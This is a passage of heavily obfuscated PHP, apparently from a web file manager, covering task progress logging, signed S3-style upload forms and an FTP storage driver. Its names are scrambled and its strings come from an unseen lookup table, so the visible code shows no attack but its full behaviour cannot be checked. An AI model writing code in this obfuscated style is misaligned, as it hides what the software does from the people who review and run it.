!file_exists($ù£’¾ß )) { return $æ½¸˜İ; } $æ½¸˜İ[$û­ÒËÌ[2032]] = @filesize($ù£’¾ß ); $æ½¸˜İ[$û­ÒËÌ[941]] += $æ½¸˜İ[$û­ÒËÌ[2032]]; self::updateTask($æ½¸˜İ); return $æ½¸˜İ; } public function copyFileEnd($Åõùˆ‘ï, $Š•µ¢‹, $“Õ’’²·, $ú™ÉãÛ‡, $ˆÔúŞ¶÷, $¤Øí€¹¬) { $¶âÊ¦Î‰ =& $_SERVER[©—Ò»ÅĞ]; $°¹•û•Ã =& $this->task; $°¹•û•Ã[$¶âÊ¦Î‰[2032]] = $°¹•û•Ã[$¶âÊ¦Î‰[2031]]; $°¹•û•Ã[$¶âÊ¦Î‰[2033]] = $¶âÊ¦Î‰[12]; unset($°¹•û•Ã[$¶âÊ¦Î‰[2002]]); if ($ˆÔúŞ¶÷ == $°¹•û•Ã[$¶âÊ¦Î‰[2029]]) { $°¹•û•Ã[$¶âÊ¦Î‰[2035]] += $°¹•û•Ã[$¶âÊ¦Î‰[2031]]; $°¹•û•Ã[$¶âÊ¦Î‰[941]] = $°¹•û•Ã[$¶âÊ¦Î‰[2035]]; $æ“ù–Ê¾ = 1; if (isset($°¹•û•Ã[$¶âÊ¦Î‰[2044]]) && $°¹•û•Ã[$¶âÊ¦Î‰[2044]] == $Š•µ¢‹) { $æ“ù–Ê¾ = 0; } $this->update($æ“ù–Ê¾); } else { $this->update(); $°¹•û•Ã[$¶âÊ¦Î‰[2032]] = 0; } Cache::remove($°¹•û•Ã[$¶âÊ¦Î‰[487]] . $¶âÊ¦Î‰[2051]); self::log($¶âÊ¦Î‰[2054] . $Š•µ¢‹ . $¶âÊ¦Î‰[73] . $ú™ÉãÛ‡ . $¶âÊ¦Î‰[285] . $ˆÔúŞ¶÷ . $¶âÊ¦Î‰[2055] . $°¹•û•Ã[$¶âÊ¦Î‰[2029]]); } public function updateFileEnd($±¢Îâè×, $…òÙİ³Ô) { $…Ÿà¸º =& $_SERVER[©—Ò»ÅĞ]; $È—‘›Ù’ =& $this->task; $È—‘›Ù’[$…Ÿà¸º[2029]] = $±¢Îâè×; $È—‘›Ù’[$…Ÿà¸º[2031]] = $…òÙİ³Ô; $È—‘›Ù’[$…Ÿà¸º[2035]] += $…òÙİ³Ô; $È—‘›Ù’[$…Ÿà¸º[941]] = $È—‘›Ù’[$…Ÿà¸º[2035]]; $this->update(1); self::log($…Ÿà¸º[2056] . $±¢Îâè×); } public function sourceModelCopy($Ç›×«õî) { $€¤²æš =& $_SERVER[©—Ò»ÅĞ]; $óŠÜ¤à¬ = $Ç›×«õî[0]; $‘Ú µãó = $Ç›×«õî[1]; $ÚŞşÖÕ† =& $this->task; $this->sourceModelCopyFlag = !0; $Æùå’Å¥ = 0; switch ($óŠÜ¤à¬) { case $€¤²æš[657]: $Æùå’Å¥ = 1; break; case $€¤²æš[660]: $ÚŞşÖÕ†[$€¤²æš[2029]] = $‘Ú µãó[$€¤²æš[32]]; break; case $€¤²æš[662]: $Æùå’Å¥ = intval($Ç›×«õî[$€¤²æš[467]] * 0.4); break; case $€¤²æš[664]: $Æùå’Å¥ = intval($Ç›×«õî[$€¤²æš[467]] * 0.2); break; case $€¤²æš[666]: $Æùå’Å¥ = intval($Ç›×«õî[$€¤²æš[467]] * 0.4); break; } $this->update($Æùå’Å¥); self::log(array("{$óŠÜ¤à¬}\x3b\x61\x64\144\x3d{$Æùå’Å¥}", $Ç›×«õî)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($²ì‡ë¾’, $ËÌ‰ÑÜÉ) { $·ÁåŞè =& $_SERVER[©—Ò»ÅĞ]; $this->sourceModelCopyFlag = !0; $ÏÙ¤îâª = 1; if (isset($²ì‡ë¾’[$·ÁåŞè[82]])) { $ÏÙ¤îâª = $²ì‡ë¾’[$·ÁåŞè[82]][$·ÁåŞè[80]]; $ÏÙ¤îâª = $ÏÙ¤îâª + $²ì‡ë¾’[$·ÁåŞè[82]][$·ÁåŞè[81]] + 1; } $this->update($ÏÙ¤îâª); $this->sourceModelCopyFlag = !1; $this->log(array($·ÁåŞè[2057], $ÏÙ¤îâª, $²ì‡ë¾’)); } public function sourceMove($‡•Ñ‡âò) { $this->sourceRemove($‡•Ñ‡âò, !1); } public function curlProgress($öæªå‡ğ, $ĞæÆø²Ö, $¾šÊ‡Ù, $´Ş‰¬ê¼, $ïÙºÃ€â) { $æ°ı” =& $_SERVER[©—Ò»ÅĞ]; $¼è®¦ù± =& $this->task; if ($ïÙºÃ€â > 0) { $¼è®¦ù±[$æ°ı”[1234]] = $æ°ı”[2058]; $¼è®¦ù±[$æ°ı”[2033]] = $æ°ı”[107]; if ($¼è®¦ù±[$æ°ı”[2031]]) { $¼è®¦ù±[$æ°ı”[2032]] = $ïÙºÃ€â; } if ($¼è®¦ù±[$æ°ı”[2034]]) { $¼è®¦ù±[$æ°ı”[2032]] = $ïÙºÃ€â + $¼è®¦ù±[$æ°ı”[2034]]; } } else { if ($¾šÊ‡Ù > 0) { if ($¼è®¦ù±[$æ°ı”[2031]] == $ĞæÆø²Ö) { $¼è®¦ù±[$æ°ı”[2032]] = $¾šÊ‡Ù; $¼è®¦ù±[$æ°ı”[1234]] = $æ°ı”[2059]; $¼è®¦ù±[$æ°ı”[2033]] = $æ°ı”[1385]; } } } $this->update(); $–ïİ«ü = "\144\x6f\x77\x6e\x3a{$¾šÊ‡Ù}\x2f{$ĞæÆø²Ö}\73\x20\x75\x70\154\x6f\x61\144\72{$ïÙºÃ€â}\57{$´Ş‰¬ê¼}\x3b\146\x69\x6c\x65\x3d" . $¼è®¦ù±[$æ°ı”[2031]]; self::log(array($æ°ı”[2060] . $–ïİ«ü . $æ°ı”[74] . $¼è®¦ù±[$æ°ı”[2029]], curl_getinfo($öæªå‡ğ))); } public function curlProgressStart($ÀÏ´÷â) { } public function curlProgressEnd($‹Ó½ö÷¬) { $âÙÔèÅ =& $_SERVER[©—Ò»ÅĞ]; $¼‹ˆŞÈ =& $this->task; $ıò“Û£á = curl_getinfo($‹Ó½ö÷¬); $Ôí—à¢ = $ıò“Û£á[$âÙÔèÅ[2061]]; if ($Ôí—à¢ == -1) { $Ôí—à¢ = $ıò“Û£á[$âÙÔèÅ[2062]]; } if ($¼‹ˆŞÈ[$âÙÔèÅ[2033]] == $âÙÔèÅ[107] && $Ôí—à¢) { $¼‹ˆŞÈ[$âÙÔèÅ[2034]] += $Ôí—à¢; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Ø èß§ò =& $_SERVER[©—Ò»ÅĞ]; $¤¸ææê =& $this->task; $¤¸ææê[$Ø èß§ò[2063]] = 1; Hook::bind($Ø èß§ò[2023], array($this, $Ø èß§ò[2064])); Hook::bind($Ø èß§ò[2025], array($this, $Ø èß§ò[2065])); Hook::bind($Ø èß§ò[2027], array($this, $Ø èß§ò[2066])); } protected function endAfter() { $¯ø•úÂ· =& $_SERVER[©—Ò»ÅĞ]; Hook::unbind($¯ø•úÂ·[2023], array($this, $¯ø•úÂ·[2064])); Hook::unbind($¯ø•úÂ·[2025], array($this, $¯ø•úÂ·[2065])); Hook::unbind($¯ø•úÂ·[2027], array($this, $¯ø•úÂ·[2066])); } public function progressStart($Â–«°®š) { $âøó·§Â =& $_SERVER[©—Ò»ÅĞ]; $¿ã¦š÷ƒ = curl_getinfo($Â–«°®š); self::log($âøó·§Â[2067] . $¿ã¦š÷ƒ[$âøó·§Â[382]]); self::valueSet($this->task[$âøó·§Â[487]], $this->task); } public function progressEnd($«Ìëş) { $¼¿½¢±Ã =& $_SERVER[©—Ò»ÅĞ]; self::log($¼¿½¢±Ã[2068] . $this->task[$¼¿½¢±Ã[487]]); $this->end(); } public function progress($îÕªßß‘, $ÉåŒ›¹, $¿ğ“æÕ´, $úçİœôü, $ú½‡‡„) { $Û¡ßÜªø =& $_SERVER[©—Ò»ÅĞ]; $şìëµæ€ =& $this->task; if ($ú½‡‡„ > 0) { $şìëµæ€[$Û¡ßÜªø[1232]] = $şìëµæ€[$Û¡ßÜªø[1232]] == 0 ? $úçİœôü : $şìëµæ€[$Û¡ßÜªø[1232]]; $şìëµæ€[$Û¡ßÜªø[1978]] = $ú½‡‡„; } else { if ($¿ğ“æÕ´ > 0) { $şìëµæ€[$Û¡ßÜªø[1232]] = $şìëµæ€[$Û¡ßÜªø[1232]] == 0 ? $ÉåŒ›¹ : $şìëµæ€[$Û¡ßÜªø[1232]]; $şìëµæ€[$Û¡ßÜªø[1978]] = $¿ğ“æÕ´; } } $this->update(); self::log("\x70\162\157\147\162\145\163\163\x48\164\x74\x70\72\144\157\167\156\72{$¿ğ“æÕ´}\x2f{$ÉåŒ›¹}\73\x20\x75\x70\x6c\157\x61\144\72{$ú½‡‡„}\x2f{$úçİœôü}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($™Œ›ªõ°, $úğÒ†¾ì = '', $®áı§¬ô = 0, $ğë¦­ò = '') { $©øİ³áÃ =& $_SERVER[©—Ò»ÅĞ]; $ğë¦­ò = $ğë¦­ò ? $ğë¦­ò : ($úğÒ†¾ì ? $úğÒ†¾ì : $™Œ›ªõ°); $ëıÃã‰Ù = new Task($™Œ›ªõ°, $úğÒ†¾ì, $®áı§¬ô, $ğë¦­ò); $GLOBALS[$©øİ³áÃ[2069] . $™Œ›ªõ°] = new TaskLog($©øİ³áÃ[1962], $ëıÃã‰Ù, $ğë¦­ò); return $ëıÃã‰Ù; } public function __construct($äÑÙøäÃ = '', $¥š«’Óô = '', $å©ğñ® = '') { $¬´èĞš½ =& $_SERVER[©—Ò»ÅĞ]; if (!$äÑÙøäÃ) { $äÑÙøäÃ = $¬´èĞš½[1962]; } $Ôíñú½Ÿ = $äÑÙøäÃ . $¬´èĞš½[476] . rand_string(10); if (!$å©ğñ®) { $å©ğñ® = $äÑÙøäÃ . $¬´èĞš½[53] . $å©ğñ®; } switch ($äÑÙøäÃ) { case $¬´èĞš½[1962]: if (!$¥š«’Óô || !$¥š«’Óô->task) { return echoLog($äÑÙøäÃ . $¬´èĞš½[2070]); } $«ã€Š«› = $¥š«’Óô; $Ôíñú½Ÿ = $«ã€Š«›->task[$¬´èĞš½[487]]; $äÑÙøäÃ = $«ã€Š«›->task[$¬´èĞš½[487]]; if (!$«ã€Š«›->task[$¬´èĞš½[1865]]) { $«ã€Š«›->task[$¬´èĞš½[1865]] = $å©ğñ® ? $å©ğñ® : $äÑÙøäÃ; } break; case $¬´èĞš½[2071]: if (!$¥š«’Óô) { return echoLog($äÑÙøäÃ . $¬´èĞš½[2072]); } $Â¨‘â¸á = is_string($¥š«’Óô) ? array($¥š«’Óô) : $¥š«’Óô; $«ã€Š«› = new TaskFileTransfer($Ôíñú½Ÿ, $äÑÙøäÃ, 0, $å©ğñ® ? $å©ğñ® : $Â¨‘â¸á[0]); foreach ($Â¨‘â¸á as $ÁÅŸ’€û) { $«ã€Š«›->addPath($ÁÅŸ’€û); } break; case $¬´èĞš½[388]: if (!$¥š«’Óô) { return echoLog($äÑÙøäÃ . $¬´èĞš½[2072]); } $Â¨‘â¸á = is_string($¥š«’Óô) ? array($¥š«’Óô) : $¥š«’Óô; $«ã€Š«› = new TaskZip($Ôíñú½Ÿ, $äÑÙøäÃ, 0, $å©ğñ® ? $å©ğñ® : $Â¨‘â¸á[0]); foreach ($Â¨‘â¸á as $ÁÅŸ’€û) { $«ã€Š«›->addPath($ÁÅŸ’€û); } break; case $¬´èĞš½[1404]: if (!$¥š«’Óô) { return echoLog($äÑÙøäÃ . $¬´èĞš½[2072]); } $«ã€Š«› = new TaskUnZip($Ôíñú½Ÿ, $äÑÙøäÃ, 0, $å©ğñ® ? $å©ğñ® : $¥š«’Óô); if ($¥š«’Óô) { $«ã€Š«›->addFile($¥š«’Óô); } break; case $¬´èĞš½[149]: $«ã€Š«› = new TaskHttp($Ôíñú½Ÿ, $äÑÙøäÃ); break; default: return; break; } $this->task = $«ã€Š«›; $this->taskID = $Ôíñú½Ÿ; Hook::bind($¬´èĞš½[1998], array($this, $¬´èĞš½[2073])); Hook::bind($¬´èĞš½[2000], array($this, $¬´èĞš½[2074])); Hook::bind($¬´èĞš½[1994], array($this, $¬´èĞš½[2075])); echoLog($¬´èĞš½[2076] . $«ã€Š«›->task[$¬´èĞš½[1865]]); } public function __destruct() { $this->end(); } public function end($Õä›•îÂ = '') { $‚××‡ıÛ =& $_SERVER[©—Ò»ÅĞ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Õä›•îÂ); $this->task = !1; $this->taskID = !1; Hook::unbind($‚××‡ıÛ[1998], array($this, $‚××‡ıÛ[2073])); Hook::unbind($‚××‡ıÛ[2000], array($this, $‚××‡ıÛ[2074])); Hook::unbind($‚××‡ıÛ[1994], array($this, $‚××‡ıÛ[2075])); } public function taskUpdate($Ë‘¬£Ù”) { $Á­ø·­• =& $_SERVER[©—Ò»ÅĞ]; if (!$Ë‘¬£Ù” || $this->taskID != $Ë‘¬£Ù”[$Á­ø·­•[487]]) { return; } $­òù½Ö” = 20; $ˆ›û¿ˆ = intval($Ë‘¬£Ù”[$Á­ø·­•[1979]] * $­òù½Ö”); $“¡‰Ÿ‚± = $Á­ø·­•[173] . str_repeat($Á­ø·­•[464], $ˆ›û¿ˆ) . $Á­ø·­•[1182] . str_repeat($Á­ø·­•[53], $­òù½Ö” - $ˆ›û¿ˆ) . $Á­ø·­•[175]; $°ûûêÖŸ = $“¡‰Ÿ‚± . sprintf($Á­ø·­•[2077], $Ë‘¬£Ù”[$Á­ø·­•[1979]] * 100) . $Á­ø·­•[2078]; $ÅûëôÍÈ = $°ûûêÖŸ . $Ë‘¬£Ù”[$Á­ø·­•[1978]] . $Á­ø·­•[8] . $Ë‘¬£Ù”[$Á­ø·­•[1232]] . LNG($Á­ø·­•[2079]); $Š€€Úß¢ = $Á­ø·­•[12]; if ($Ë‘¬£Ù”[$Á­ø·­•[2063]]) { $ÅûëôÍÈ = $°ûûêÖŸ . size_format($Ë‘¬£Ù”[$Á­ø·­•[1978]]) . $Á­ø·­•[8] . size_format($Ë‘¬£Ù”[$Á­ø·­•[1232]]); $Š€€Úß¢ = size_format($Ë‘¬£Ù”[$Á­ø·­•[1980]]) . $Á­ø·­•[2080]; } if ($Ë‘¬£Ù”[$Á­ø·­•[1234]]) { $Ë‘¬£Ù”[$Á­ø·­•[2029]] = $Ë‘¬£Ù”[$Á­ø·­•[1234]] . $Á­ø·­•[53] . $Ë‘¬£Ù”[$Á­ø·­•[2029]]; } if ($Ë‘¬£Ù”[$Á­ø·­•[2029]]) { $ªæŠÙÒü = $Á­ø·­•[12]; if ($Ë‘¬£Ù”[$Á­ø·­•[2031]]) { $ªæŠÙÒü = $Á­ø·­•[50] . size_format($Ë‘¬£Ù”[$Á­ø·­•[2032]]) . $Á­ø·­•[8] . size_format($Ë‘¬£Ù”[$Á­ø·­•[2031]]); } $Š€€Úß¢ .= $Ë‘¬£Ù”[$Á­ø·­•[2029]] . $ªæŠÙÒü; } if ($Ë‘¬£Ù”[$Á­ø·­•[864]] && !$Ë‘¬£Ù”[$Á­ø·­•[2031]]) { $Š€€Úß¢ .= $Á­ø·­•[53] . size_format($Ë‘¬£Ù”[$Á­ø·­•[941]]) . $Á­ø·­•[8] . size_format($Ë‘¬£Ù”[$Á­ø·­•[864]]); } echoLog($ÅûëôÍÈ . $Á­ø·­•[53] . $Š€€Úß¢, !0); } public function taskEnd($Ó¬¥Ìµı) { $¿ÏäÏ¡ =& $_SERVER[©—Ò»ÅĞ]; if (!$Ó¬¥Ìµı || $this->taskID != $Ó¬¥Ìµı[$¿ÏäÏ¡[487]]) { return; } $§«Ôè = $Ó¬¥Ìµı ? LNG($¿ÏäÏ¡[2081]) . $¿ÏäÏ¡[4] . $Ó¬¥Ìµı[$¿ÏäÏ¡[1978]] . $¿ÏäÏ¡[8] . $Ó¬¥Ìµı[$¿ÏäÏ¡[1232]] . LNG($¿ÏäÏ¡[2079]) . $¿ÏäÏ¡[74] : $¿ÏäÏ¡[12]; echoLog($¿ÏäÏ¡[2082] . $Ó¬¥Ìµı[$¿ÏäÏ¡[1865]] . ($Ó¬¥Ìµı[$¿ÏäÏ¡[540]] ? $¿ÏäÏ¡[74] . $Ó¬¥Ìµı[$¿ÏäÏ¡[540]] : $¿ÏäÏ¡[12]) . $¿ÏäÏ¡[74] . $§«Ôè . $¿ÏäÏ¡[2083] . sprintf($¿ÏäÏ¡[1008], timeFloat() - $Ó¬¥Ìµı[$¿ÏäÏ¡[1981]]) . $¿ÏäÏ¡[1993]); $this->end(); } public function taskKill($ÆÃÊ•µŞ) { $İñÊÍ÷ =& $_SERVER[©—Ò»ÅĞ]; if (!$ÆÃÊ•µŞ || $this->taskID != $ÆÃÊ•µŞ[$İñÊÍ÷[487]]) { return; } echoLog($İñÊÍ÷[2084] . $ÆÃÊ•µŞ[$İñÊÍ÷[1865]]); } } goto d‹Ğ»âëò‹; E¿÷à²®„“: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¦‚ÍÖª•) { parent::__construct($¦‚ÍÖª•); $this->setSignVersion($_SERVER[©—Ò»ÅĞ][247]); } public function uploadFormData($•ĞöÓÁ, $ŸĞÖ¬ª¸ = 3600) { $ÔúœÕáÖ =& $_SERVER[©—Ò»ÅĞ]; $¶š€¢ğ = $ÔúœÕáÖ[229]; $Ğô©é›Â = $ÔúœÕáÖ[257]; $‹©ùÙ¬ü = $ÔúœÕáÖ[62]; $ó»óõºç = gmdate($ÔúœÕáÖ[258]); $™¾”ëÌ¦ = gmdate($ÔúœÕáÖ[259]); $ªÕÈå§ß = $ÔúœÕáÖ[260]; $›ˆ»¨ö = $ŸĞÖ¬ª¸ . $ÔúœÕáÖ[12]; $öÆŠÎåÔ = $ÔúœÕáÖ[261]; $‡³üÓ÷  = array($this->accessKey, $™¾”ëÌ¦, $this->region, $‹©ùÙ¬ü, $ªÕÈå§ß); $ŠìºìÄ¶ = implode($ÔúœÕáÖ[8], $‡³üÓ÷ ); $…ªªÅõ = array($ÔúœÕáÖ[262] => gmdate($ÔúœÕáÖ[1525], strtotime($ÔúœÕáÖ[264])), $ÔúœÕáÖ[265] => array(array($ÔúœÕáÖ[266] => $this->bucket), array($ÔúœÕáÖ[306] => $¶š€¢ğ), array($ÔúœÕáÖ[267], $ÔúœÕáÖ[268], $ÔúœÕáÖ[12]), array($ÔúœÕáÖ[267], $ÔúœÕáÖ[269], $ÔúœÕáÖ[12]), array($ÔúœÕáÖ[267], $ÔúœÕáÖ[307], $ÔúœÕáÖ[12]), array($ÔúœÕáÖ[270] => $öÆŠÎåÔ), array($ÔúœÕáÖ[271] => $ŠìºìÄ¶), array($ÔúœÕáÖ[272] => $Ğô©é›Â), array($ÔúœÕáÖ[273] => $ó»óõºç), array($ÔúœÕáÖ[274] => $›ˆ»¨ö))); $»Çä’Áƒ = base64_encode(json_encode($…ªªÅõ)); $‘äÅ¯œÆ = hash_hmac($ÔúœÕáÖ[275], $™¾”ëÌ¦, $ÔúœÕáÖ[276] . $this->secret, !0); $òâ“®ˆ = hash_hmac($ÔúœÕáÖ[275], $this->region, $‘äÅ¯œÆ, !0); $ÒÊ×ò·Í = hash_hmac($ÔúœÕáÖ[275], $‹©ùÙ¬ü, $òâ“®ˆ, !0); $¦’‰İÃ× = hash_hmac($ÔúœÕáÖ[275], $ªÕÈå§ß, $ÒÊ×ò·Í, !0); $õñŒà‹ƒ = hash_hmac($ÔúœÕáÖ[275], $»Çä’Áƒ, $¦’‰İÃ×); $ÑşÈ‘Ïµ = array($ÔúœÕáÖ[246] => $ÔúœÕáÖ[12], $ÔúœÕáÖ[294] => $ÔúœÕáÖ[12], $ÔúœÕáÖ[306] => $¶š€¢ğ, $ÔúœÕáÖ[270] => $öÆŠÎåÔ, $ÔúœÕáÖ[277] => $»Çä’Áƒ, $ÔúœÕáÖ[308] => $ŠìºìÄ¶, $ÔúœÕáÖ[309] => $Ğô©é›Â, $ÔúœÕáÖ[310] => $ó»óõºç, $ÔúœÕáÖ[311] => $›ˆ»¨ö, $ÔúœÕáÖ[312] => $õñŒà‹ƒ, $ÔúœÕáÖ[206] => $this->getHost()); return $ÑşÈ‘Ïµ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($Åºñ³Ê) { parent::__construct(); if (count($Åºñ³Ê) > 0) { $this->_init($Åºñ³Ê); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($™áæ½–ñ) { $¼Ñ¦çŒ¶ =& $_SERVER[©—Ò»ÅĞ]; global $config; $this->appCharset = $config[$¼Ñ¦çŒ¶[1646]]; $this->systemCharset = $config[$¼Ñ¦çŒ¶[1647]]; if (isset($™áæ½–ñ[$¼Ñ¦çŒ¶[1648]]) && $™áæ½–ñ[$¼Ñ¦çŒ¶[1648]]) { $this->systemCharset = $™áæ½–ñ[$¼Ñ¦çŒ¶[1648]]; } } public function iconvApp($‹òÖØÓ™) { return $this->iconvTo($‹òÖØÓ™, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÆÔ½ßœá) { return $this->iconvTo($ÆÔ½ßœá, $this->appCharset, $this->systemCharset); } public function getPathOuter($ïÎ­Ÿğ‹) { $Ãáõêé‚ =& $_SERVER[©—Ò»ÅĞ]; $üÈ†Úú‚ = $this->iconvApp($this->pathBase); $ïÎ­Ÿğ‹ = $this->iconvApp($ïÎ­Ÿğ‹); if (substr($üÈ†Úú‚, 0, 2) == $Ãáõêé‚[1523]) { $üÈ†Úú‚ = BASIC_PATH . substr($üÈ†Úú‚, 2); } if (substr($ïÎ­Ÿğ‹, 0, 2) == $Ãáõêé‚[1523]) { $ïÎ­Ÿğ‹ = BASIC_PATH . substr($ïÎ­Ÿğ‹, 2); } $üÈ†Úú‚ = KodIO::clear($üÈ†Úú‚); $ïÎ­Ÿğ‹ = KodIO::clear($ïÎ­Ÿğ‹); $ïÎ­Ÿğ‹ = substr($ïÎ­Ÿğ‹, strlen($üÈ†Úú‚)); if (empty($this->pathDriver)) { return $ïÎ­Ÿğ‹; } return $this->pathDriver . $Ãáõêé‚[8] . ltrim($ïÎ­Ÿğ‹, $Ãáõêé‚[8]); } private function _init($Œõ‹Œ¹ê = array()) { $†¾Ğ‘ÜÉ =& $_SERVER[©—Ò»ÅĞ]; if (!function_exists($†¾Ğ‘ÜÉ[1649])) { throw new Exception(LNG($†¾Ğ‘ÜÉ[1650])); } $this->config = $Œõ‹Œ¹ê; $this->charsetReset($Œõ‹Œ¹ê); foreach ($Œõ‹Œ¹ê as $âÛÎæŸ› => $„»Õ¢¢ô) { if (isset($this->{$âÛÎæŸ›})) { $this->{$âÛÎæŸ›} = $„»Õ¢¢ô; } } return $this->_login($Œõ‹Œ¹ê); } private function _login($»¡Öó’) { $ö± ûºõ =& $_SERVER[©—Ò»ÅĞ]; static $‡±§²Å = array(); $½Ÿğ’Ö = md5(json_encode($»¡Öó’)); if (isset($‡±§²Å[$½Ÿğ’Ö])) { foreach ($‡±§²Å[$½Ÿğ’Ö] as $äÕÔĞË“ => $¸ìéÔŒé) { $this->{$äÕÔĞË“} = $¸ìéÔŒé; } return !0; } $æøßşÁ² = parse_url(trim($this->server, $ö± ûºõ[8])); $this->host = $æøßşÁ²[$ö± ûºõ[206]]; $äÖºšô = isset($æøßşÁ²[$ö± ûºõ[205]]) && $æøßşÁ²[$ö± ûºõ[205]] == $ö± ûºõ[1651] ? !0 : !1; $this->scheme = $äÖºšô ? $ö± ûºõ[1652] : $ö± ûºõ[1653]; $this->port = isset($æøßşÁ²[$ö± ûºõ[207]]) ? $æøßşÁ²[$ö± ûºõ[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ö± ûºõ[1654]) . $this->host . $ö± ûºõ[4] . $this->port, !0); return !1; } $ÁÎò÷Ş· = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ÁÎò÷Ş·) { $this->writeLog(LNG($ö± ûºõ[1655]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $ö± ûºõ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $†È¤ÑÛ— = $this->pasv == $ö± ûºõ[91] ? !0 : !1; @ftp_pasv($this->connect, $†È¤ÑÛ—); $‡±§²Å[$½Ÿğ’Ö] = array($ö± ûºõ[1656] => $this->connect, $ö± ûºõ[206] => $this->host, $ö± ûºõ[205] => $this->scheme, $ö± ûºõ[207] => $this->port); return $ÁÎò÷Ş·; } private function _isconn($ú¼İÜí = true) { if (is_resource($this->connect)) { return !0; } if (!$ú¼İÜí) { return !1; } return $this->_login($this->config); } public function mkfile($Ğ‹¢ëÕÑ, $»æÉ¥‘ = '', $Úá’ãÚØ = REPEAT_RENAME) { if ($this->setContent($Ğ‹¢ëÕÑ, $»æÉ¥‘)) { return $this->getPathOuter($Ğ‹¢ëÕÑ); } $this->writeLog(LNG($_SERVER[©—Ò»ÅĞ][1657]), !0); return !1; } public function mkdir($ï€ãÜ£ , $¬Ø¡µå = REPEAT_SKIP) { $Ñå½§ìÏ =& $_SERVER[©—Ò»ÅĞ]; if (!$ï€ãÜ£  || $ï€ãÜ£  == $Ñå½§ìÏ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ï€ãÜ£  = $this->iconvSystem($ï€ãÜ£ ); if ($this->_isFolder($ï€ãÜ£ ) || @ftp_mkdir($this->connect, $ï€ãÜ£ )) { return $this->getPathOuter($ï€ãÜ£ ); } if (!$this->mkdir($this->pathFather($ï€ãÜ£ ))) { return !1; } if ($ï€ãÜ£  = @ftp_mkdir($this->connect, $ï€ãÜ£ )) { return $this->getPathOuter($ï€ãÜ£ ); } $Ÿ”¨ÃùÛ = __FUNCTION__ . $Ñå½§ìÏ[1658]; $this->writeLog($Ÿ”¨ÃùÛ, !0); return !1; } public function copyFile($Û–»ì‹Ï, $Òò»ÍÈË) { if (!$this->_isconn()) { return !1; } $¿ô£õ…ü = $this->pathThis($this->iconvSystem($Û–»ì‹Ï)); $‡ìĞµûŞ = $this->tempFile($¿ô£õ…ü); $Ä‚»İ‘ = $this->iconvApp($‡ìĞµûŞ); $this->download($Û–»ì‹Ï, $Ä‚»İ‘); $¼»åÑãœ = $this->upload($Òò»ÍÈË, $Ä‚»İ‘); $this->tempFileRemve($‡ìĞµûŞ); return $¼»åÑãœ; } public function moveFile($´¤¥Íµ´, $¯ı¢â´ƒ) { if (!$this->_isconn()) { return !1; } $´¤¥Íµ´ = $this->iconvSystem($´¤¥Íµ´); $¯ı¢â´ƒ = $this->iconvSystem($¯ı¢â´ƒ); $Âï§ëŠ« = @ftp_rename($this->connect, $´¤¥Íµ´, $¯ı¢â´ƒ); if (!$Âï§ëŠ«) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][1658], !0); return !1; } return $this->getPathOuter($¯ı¢â´ƒ); } public function delFile($Ä‘Í‚à) { if (!$this->_isconn()) { return !1; } $Ä‘Í‚à = $this->iconvSystem($Ä‘Í‚à); $Ğ«ï†ŞÂ = @ftp_delete($this->connect, $Ä‘Í‚à); if (!$Ğ«ï†ŞÂ) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][1658], !0); } return $Ğ«ï†ŞÂ; } public function delFolder($ò†ó¯¤“) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $«»˜«ë¼ = $’°¹Åú‹ = array(); $this->fileList($ò†ó¯¤“, $«»˜«ë¼, $’°¹Åú‹, !0); $this->listItemCache = !0; foreach ($’°¹Åú‹ as $×±²Œö‘) { $ÉÔÍÂ÷ä = $this->iconvSystem($×±²Œö‘[$_SERVER[©—Ò»ÅĞ][32]]); $º§µûĞ‹ = @ftp_delete($this->connect, $ÉÔÍÂ÷ä); if (!$º§µûĞ‹) { return !1; } } foreach ($«»˜«ë¼ as $ÉÔÍÂ÷ä) { $ÉÔÍÂ÷ä = $this->iconvSystem($ÉÔÍÂ÷ä); $º§µûĞ‹ = @ftp_rmdir($this->connect, $ÉÔÍÂ÷ä); if (!$º§µûĞ‹) { return !1; } } $ò†ó¯¤“ = $this->iconvSystem($ò†ó¯¤“); return @ftp_rmdir($this->connect, $ò†ó¯¤“); } public function rename($¥ØúçÈ, $ññìô) { $…ãÑ²ÁÃ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->_isconn()) { return !1; } $¥¼ùæïà = $this->fileNameAuto($this->pathFather($¥ØúçÈ), $ññìô); $¥¼ùæïà = $this->iconvSystem($¥¼ùæïà); $¥ØúçÈ = $this->iconvSystem($¥ØúçÈ); $ßÇ˜éû = $this->pathFather($¥ØúçÈ); $í»Åå÷ = rtrim($ßÇ˜éû, $…ãÑ²ÁÃ[8]) . $…ãÑ²ÁÃ[8] . $¥¼ùæïà; $ì¤à‰¬ö = @ftp_rename($this->connect, $¥ØúçÈ, $í»Åå÷); if (!$ì¤à‰¬ö) { $this->writeLog(__FUNCTION__ . $…ãÑ²ÁÃ[1658], !0); return !1; } $í»Åå÷ = $this->iconvApp($í»Åå÷); return $this->getPathOuter($í»Åå÷); } private function folderInfo($¡œ½ğÙÚ, $è²Ÿ”£æ = false) { $¢ŠïÒ»‹ =& $_SERVER[©—Ò»ÅĞ]; $éœ»ú ¢ = array($¢ŠïÒ»‹[32] => $this->pathThis($¡œ½ğÙÚ), $¢ŠïÒ»‹[87] => $this->getPathOuter($¢ŠïÒ»‹[8] . 